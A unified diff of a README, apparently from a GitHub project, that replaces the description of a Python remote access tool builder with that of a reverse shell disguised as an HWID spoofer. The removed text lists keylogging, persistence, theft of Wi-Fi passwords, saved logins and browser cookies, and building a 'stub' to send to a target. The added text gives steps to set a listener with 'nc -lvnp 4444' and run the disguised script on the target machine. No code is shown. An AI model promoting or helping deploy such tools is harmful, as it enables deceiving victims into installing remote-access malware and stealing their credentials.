@@ -1,98 +1,52 @@
-<!-- PROJECT SHIELDS -->
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
+# Reverse Shell
 
-## About The Project
+![Image](https://i.imgur.com/x9r6DIW.png)
 
-A (remote access tool) builder written in python.
-
-![running the tool](https://i.imgur.com/zCQSJMu.jpg)
+This Python script combines a reverse shell with a simulated HWID spoofer. It allows a remote connection to execute commands on the target machine, while also simulating the process of spoofing the Hardware ID (HWID) and MAC address.
 
 ## Features
 
- - Take camera snapshots.
+-   **Reverse Shell:** Establishes a connection back to a specified IP address and port, allowing remote command execution.
+-   **Simulated HWID Spoofing:** Simulates the process of changing the HWID and MAC address using a visual interface with `tqdm` progress bars and `pyfiglet` for stylized text.
+-   **System Information Gathering:** Retrieves and displays user, PC name, OS version, and IP address.
+-   **Console Clearing:** Clears the console for a cleaner interface.
+-   **Hides Console Window:** Option to hide the console window on Windows.
 
- - Take screenshots.
+## Requirements
 
- - Can Download files.
+-   Python 3.x
+-   `colorama`: For colored terminal output.
+-   `tqdm`: For progress bars.
+-   `pyfiglet`: For ASCII art fonts.
 
- - Upload files.
+To install the required packages, run:
 
- - Keylogger.
+```bash
+pip install colorama tqdm pyfiglet
+```
 
- - Persistence.
-
- - Show wifi names and passwords.
-
- - Bind with a seperate file.
-
- - Get saved usernames and passwords.
-
- - Get browser cookies.
-
-
-### Installation
-
-1. Clone the repo
-   ```sh
-   git clone https://github.com/herawenn/Remote-Access
-   ```
-2. Install requirements
-   ```sh
-   pip install -r requirements.txt
-   ```
-3. Run the program
-   ```sh
-   python builder.py -ip <ip_address> -p <port_number>
-   ```
-
-<!-- USAGE EXAMPLES -->
 ## Usage
 
-* **-ip** = `Set the ip address`
-*  **-p** = `Set the port number`
-*  **-i** = `Set the icon`
-*  **-f** = `Set the file to bind`
+1. Modify the TARGET_IP and TARGET_PORT variables in the script to match the IP address and port of your listening server.
 
-! To use an icon or bind with another file, they must be in the main directory of the project
+TARGET_IP = '127.0.0.1'  # Replace with your listening IP
+TARGET_PORT = 4444       # Replace with your listening port
 
-`builder.py` will compile `client.py` into an executable (located in the 'dist' folder)
-This exe (also known as a 'stub') is what you will send to your target.
+2. Use netcat or a similar tool to listen on the specified port.
+```bash
+nc -lvnp 4444
+```
 
-Listen for incoming connections:
-`python server.py -ip <ip_addres> -p <port_number>`
+3. Run the Script on the target machine:
+```py
+python reverse.py
+```
 
-Once a connections is established, you can run commands on the target machine remotely.
-Try `Help` to get started.
+Contributing
+Contributions are welcome! Please open an issue or submit a pull request.
 
-<!-- CONTRIBUTING -->
-## Contributing
+License
+This project is licensed under the MIT License - see the LICENSE file for details.
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
-
-If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
-Don't forget to give the project a star! Thanks again!
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-<!-- CONTACT -->
-## Contact
-
-[Telegram](https://t.me/mulicious) 
-[Discord](https://discord.gg/portlords)
-[Cracked](https://cracked.io/herawen)
-Project Link: [https://github.com/herawenn/Remote-Access](https://github.com/herawenn/Remote-Access)
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-[forks-shield]: https://img.shields.io/github/forks/herawenn/Remote-Access.svg?style=for-the-badge
-[forks-url]: https://github.com/herawenn/Remote-Access/network/members
-[stars-shield]: https://img.shields.io/github/stars/herawenn/Remote-Access.svg?style=for-the-badge
-[stars-url]: https://github.com/herawenn/Remote-Access/stargazers
-[issues-shield]: https://img.shields.io/github/issues/herawenn/Remote-Access.svg?style=for-the-badge
-[issues-url]: https://github.com/herawenn/Remote-Access/issues
+Disclaimer
+This script is intended for educational and testing purposes only. Use it responsibly and only on systems you have permission to access. *The HWID spoofing part of the script is a simulation and does not actually change the HWID or MAC address of the system.*
